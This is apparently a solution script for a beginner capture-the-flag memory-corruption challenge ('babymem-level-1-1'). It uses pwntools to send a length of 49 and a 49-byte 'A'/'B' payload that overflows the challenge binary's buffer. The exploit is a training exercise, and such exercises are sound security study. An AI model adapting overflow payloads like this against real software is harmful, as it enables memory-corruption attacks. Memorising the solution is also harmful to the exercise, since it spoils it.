import pwn

p = pwn.process("/challenge/babymem-level-1-1")

p.writeline("49")
p.write("A"*48+"B")
print(p.readall().decode("utf-8"))
